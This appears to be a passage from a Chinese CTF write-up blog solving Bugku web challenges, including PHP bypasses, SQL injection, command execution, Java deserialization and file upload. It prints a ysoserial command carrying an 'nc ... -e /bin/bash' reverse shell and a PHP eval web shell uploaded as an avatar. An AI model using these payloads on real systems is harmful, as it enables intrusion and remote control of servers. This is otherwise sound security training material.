<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>); </span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>); </span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>( </span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;       <span class="comment">//看这里 </span></span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123; </span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>]; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析源码，前面判断传参，后面判断cookie必须满足margin&#x3D;margin才能访问keys.php，别忘了编码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109120406614.png" alt="image-20221109120406614"></p>
<p>返回页面查看源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109120430019.png" alt="image-20221109120430019"></p>
<h2 id="39-never-give-up"><a href="#39-never-give-up" class="headerlink" title="39.never_give_up"></a>39.never_give_up</h2><p>打开网页，查看源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109121555095.png" alt="image-20221109121555095"></p>
<p>访问，发现跳转</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109121627154.png" alt="image-20221109121627154"></p>
<p>抓包看看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109121916713.png" alt="image-20221109121916713"></p>
<p>进行URL解码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109122132233.png" alt="image-20221109122132233"></p>
<p>解码后有点像base64，继续解码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109122216301.png" alt="image-20221109122216301"></p>
<p>有的点像URL，继续解码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109122349561.png" alt="image-20221109122349561"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&quot;flag&#123;***********&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">如果不存在GET传参的id就跳转到 hello.php?id=<span class="number">1</span>并退出程序</span><br><span class="line">这个简单，我们直接给id传参<span class="number">0</span>就可以绕过</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))<span class="comment">// $a no have .</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"> 分别三个GET传参，然后匹配<span class="variable">$a</span> 中是否含有符号.(点)，绕过就是符号不含.就行</span><br><span class="line"></span><br><span class="line">stripos就是匹配 <span class="variable">$a</span> 中第一次匹配到的 </span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">向变量<span class="variable">$data</span>写入<span class="variable">$a</span>的数据，就是<span class="variable">$data</span>=<span class="variable">$a</span>的意思，但是这里使用了file_get_contents这个函数，所以我们要利用地址的形式，形如http:<span class="comment">//  或者  php://</span></span><br><span class="line"></span><br><span class="line">其中php:<span class="comment">//就是php的伪协议</span></span><br><span class="line"></span><br><span class="line">伪协议就是小众协议的意思，比如php的伪协议只有php认识</span><br><span class="line">这次就利用php伪协议的一种</span><br><span class="line">php:<span class="comment">//input</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">只要满足这串代码就可以得到flag了</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;bugku is a nice plateform!&quot;</span></span><br><span class="line">这里使用php伪协议就可以实现。</span><br><span class="line"><span class="variable">$id</span>==<span class="number">0</span> 因为传入id=<span class="number">0</span>会被认为没有传参，所以我们传入id=<span class="number">0</span>a就可以满足</span><br><span class="line"></span><br><span class="line">这里考到了弱比较</span><br><span class="line"></span><br><span class="line">”<span class="number">0</span>aaaa“==<span class="string">&quot;0&quot;</span>是成立的，因为数字和字母不可比较，只要字母前面的数字全一样就可以</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line"></span><br><span class="line">”<span class="number">768</span>sfaf“ == <span class="string">&quot;768&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;123as&quot;</span>  不等于  ”<span class="number">12</span>asd“</span><br><span class="line"><span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span>     就是变量<span class="variable">$b</span>的长度大于<span class="number">5</span> </span><br><span class="line"><span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>)   </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">eregi</span>()匹配函数，匹配到则是True</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)  -&gt;  拼接 “<span class="number">111</span>”和  <span class="variable">$b</span>的第一个字符  （.是拼接字符串的意思）</span><br><span class="line"></span><br><span class="line">比如<span class="variable">$b</span>=<span class="number">4321</span>    那么  <span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>) 就是<span class="number">1114</span></span><br><span class="line"><span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)  -&gt;这就和上面一句矛盾了呀，第一个数字又要等于<span class="number">4</span>又不能等于<span class="number">4</span>怎么办？</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用*通配符   只要传入<span class="variable">$b</span>=*<span class="number">12345</span>就可以满足啦</span><br><span class="line"></span><br><span class="line">*代表任意字符</span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109174858215.png" alt="image-20221109174858215"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">stripos()函数的语法</span><br><span class="line">stripos(string,find,start)</span><br><span class="line"></span><br><span class="line">该函数有是三个参数，其中前面两个参数是必须要有的，第三个参数是可有可无的参数描述</span><br><span class="line"></span><br><span class="line">string必需。规定被搜索的字符串。</span><br><span class="line"></span><br><span class="line">find必需。规定要查找的字符。</span><br><span class="line"></span><br><span class="line">start可选。规定开始搜索的位置。</span><br><span class="line"></span><br><span class="line">stripos()函数的返回值</span><br><span class="line">stripos()函数返回某字符串在该字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。字符串位置从 0 开始，不是从 1 开始。</span><br><span class="line"></span><br><span class="line">file_get_contents() 函数把整个文件读入一个字符串中。</span><br><span class="line"></span><br><span class="line">file_get_contents(“php://input”)的用法：</span><br><span class="line">$data = file_get_contents(“php://input”);</span><br><span class="line">　　php://input 是个可以访问请求的原始数据的只读流。</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="40-shell"><a href="#40-shell" class="headerlink" title="40.shell"></a>40.shell</h2><p><img src="https://img-blog.csdnimg.cn/756302fd2cc342e68cbc33240ae0a631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0OTU5MjYz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>访问目标地址，可以发现是一个空白页</p>
<p><img src="https://img-blog.csdnimg.cn/f3eb1e4b943a4515b1e4cdff2e95872c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0OTU5MjYz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>根据描述中说的马，最后是($_GET[‘s’])，所以应该是传入一个s参数</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109175547912.png" alt="image-20221109175547912"></p>
<p>查看此文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109175619403.png" alt="image-20221109175619403"></p>
<h2 id="41-ez-java-serialize"><a href="#41-ez-java-serialize" class="headerlink" title="41.ez_java_serialize"></a>41.ez_java_serialize</h2><p>基础的java反序列化题目</p>
<p>打开网页，啥也没有</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109182945916.png" alt="image-20221109182945916"></p>
<p>看附件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109183236400.png" alt="image-20221109183236400"></p>
<p>存在依赖commons-collections组件，其3.1版本存在反序列化漏洞</p>
<p>打开如下文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109183602448.png" alt="image-20221109183602448"></p>
<p>需要输入请求参数name，注意name会经过base64解码 再进行反序列化，因此在传入参数之前需要对payload进行base64编码</p>
<p>推荐使用ysoserial-0.0.6-SNAPSHOT-all.jar工具包，生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &quot;nc ip port -e /bin/bash&quot; |base64 -w0 &gt;poc.bin</span><br></pre></td></tr></table></figure>

<p>在公网主机上开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p port</span><br></pre></td></tr></table></figure>

<p>将生成的payload作为name的value输入</p>
<p><img src="https://img-blog.csdnimg.cn/4840b0cc32264fd68917065bd187869a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2lsdmVyICAgICAgIEJ1bGxldA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>在公网主机上ls一下，就可以看到flag，cat flag，over</p>
<p><img src="https://img-blog.csdnimg.cn/641d63faff8d483cb854ab7263c105f0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2lsdmVyICAgICAgIEJ1bGxldA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><strong>此题没有解决，后期继续学习</strong></p>
<h2 id="42-成绩查询"><a href="#42-成绩查询" class="headerlink" title="42.成绩查询"></a>42.成绩查询</h2><p>打开网页似乎要用SQL注入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110100434797.png" alt="image-20221110100434797"></p>
<p>修改数据包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110100553230.png" alt="image-20221110100553230"></p>
<p>排序，在第五个的时候没有数据了</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110100652045.png" alt="image-20221110100652045"></p>
<p>将ID&#x3D;0，联合注入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110101005556.png" alt="image-20221110101005556"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110101217440.png" alt="image-20221110101217440"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110101411745.png" alt="image-20221110101411745"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110114540043.png" alt="image-20221110114540043"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110114757606.png" alt="image-20221110114757606"></p>
<h2 id="43-秋名山车神"><a href="#43-秋名山车神" class="headerlink" title="43.秋名山车神"></a>43.秋名山车神</h2><p>每次刷新都不一样，需要传参</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110131730114.png" alt="image-20221110131730114"></p>
<p>这么长的数字计算器算都可能溢出，所以上脚本，本题采用正则表达式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#引入request库</span></span><br><span class="line"><span class="keyword">import</span> re 		<span class="comment">#引入re库</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://114.67.175.224:15617/&#x27;&#x27;&#x27;</span></span><br><span class="line">s = requests.session()  <span class="comment">#用session会话保持表达式是同一个</span></span><br><span class="line">retuen = s.get(url)</span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>, retuen.text).group()</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">eval</span>(equation)	<span class="comment">#eval() 函数用来执行一个字符串表达式，并返回表达式的值</span></span><br><span class="line">key = &#123;<span class="string">&#x27;value&#x27;</span>:result&#125;</span><br><span class="line"><span class="built_in">print</span>(s.post(url, data = key).text)</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221110142727622.png" alt="image-20221110142727622"></p>
<p>需要多运行几次才能有显示结果</p>
<p><strong>不懂，续看</strong></p>
<h2 id="44-速度要快"><a href="#44-速度要快" class="headerlink" title="44.速度要快"></a>44.速度要快</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221111185305473.png" alt="image-20221111185305473"></p>
<p>提示让我们用POST的方式提交参数margin</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221111185102481.png" alt="image-20221111185102481"></p>
<p>在回应头中发现一个用base64编码的flag，解码试试</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221111185153192.png" alt="image-20221111185153192"></p>
<p>然后用户POST发送margin&#x3D;MTUwNzUy</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221111190640424.png" alt="image-20221111190640424"></p>
<p>继续解码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221111194741065.png" alt="image-20221111194741065"></p>
<p>仍然不行</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221111194838839.png" alt="image-20221111194838839"></p>
<p>重新查看请求头</p>
<p>发现请求头不是一成不变的</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221111203003681.png" alt="image-20221111203003681"></p>
<p>写python脚本，然后运行得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="comment">#requests库的session会话对象可以跨请求保持某些参数</span></span><br><span class="line">r=s.get(<span class="string">&quot;http://114.67.175.224:15340/&quot;</span>)</span><br><span class="line"><span class="comment"># print(r.headers)</span></span><br><span class="line"><span class="comment">#flag在header里</span></span><br><span class="line">aaa=r.headers[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">flag=base64.b64decode(r.headers[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&quot;: &quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"><span class="comment">#base64解密</span></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line">flag1=base64.b64decode(flag).decode()</span><br><span class="line"><span class="comment">#base64再解密</span></span><br><span class="line"><span class="comment"># print(flag1)</span></span><br><span class="line">dic=&#123;<span class="string">&quot;margin&quot;</span>:flag1&#125;</span><br><span class="line">tr=s.post(<span class="string">&quot;http://114.67.175.224:15340/&quot;</span>,data=dic)</span><br><span class="line"><span class="comment">#post参数</span></span><br><span class="line"><span class="built_in">print</span>(tr.text)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">Python中split是一个内置函数，用来对字符串进行分割，分割后的字符串以列表形式返回</span><br><span class="line"></span><br><span class="line">split()中如果没有参数，函数默认以空格，tab空格符，换行符等作为分割条件</span><br><span class="line"></span><br><span class="line">split(<span class="string">&quot;/&quot;</span>)中有参数时，会以参数作为分割条件，把字符串进行分割，得到的每个分割段作为列表的元素返回</span><br><span class="line"></span><br><span class="line">第二个参数表示分割几次</span><br><span class="line">split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">获取最后一个参数</span><br><span class="line">split(<span class="string">&quot;/&quot;</span>)[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>



<p><strong>脚本没有运行成功（应该是python环境的问题）</strong></p>
<h2 id="45-聪明的php"><a href="#45-聪明的php" class="headerlink" title="45.聪明的php"></a>45.聪明的php</h2><p>打开网页</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112103821701.png" alt="image-20221112103821701"></p>
<p>随机传一个参数，得到源码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112103953764.png" alt="image-20221112103953764"></p>
<p>过滤了不少函数，但看了一下，passthru没有被过滤 这个函数可以代替system()</p>
<p>传值?a&#x3D;4测试是否执行</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112104304545.png" alt="image-20221112104304545"></p>
<p>存在命令执行漏洞</p>
<p>构造 payload ：?f&#x3D;{print_r(scandir(“&#x2F;“))}</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112110129017.png" alt="image-20221112110129017"></p>
<p>_2868文件不一样，查看他</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112110454407.png" alt="image-20221112110454407"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">scandir()用于获取指定目录中可用的文件和目录的列表</span><br></pre></td></tr></table></figure>







<h2 id="46-xxx二手交易市场"><a href="#46-xxx二手交易市场" class="headerlink" title="46.xxx二手交易市场"></a>46.xxx二手交易市场</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112110709473.png" alt="image-20221112110709473"></p>
<p>注册账号登录，头像上传可以用文件上传</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112111149048.png" alt="image-20221112111149048"></p>
<p>头像那里文件上传抓包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112112023209.png" alt="image-20221112112023209"></p>
<p>先把<code>&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;base64</code>加密一下，提换掉后面的一长串，然后改一下后缀为<code>php</code></p>
<p><img src="https://img-blog.csdnimg.cn/3365aa36a4d44f37a8938f19cff81321.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAfiBWZW51cw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>浏览器访问木马</p>
<p><img src="https://img-blog.csdnimg.cn/db51c88a6bae4051aef911e333436d00.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAfiBWZW51cw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>蚁剑连接</p>
<p><img src="https://img-blog.csdnimg.cn/75d6ba9bbe634d64954ec38426756e4e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAfiBWZW51cw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/b6333dc00c0d4e61ba037f06740f45d9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAfiBWZW51cw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="47-闪电十六鞭"><a href="#47-闪电十六鞭" class="headerlink" title="47.闪电十六鞭"></a>47.闪电十六鞭</h2><p>打开</p>
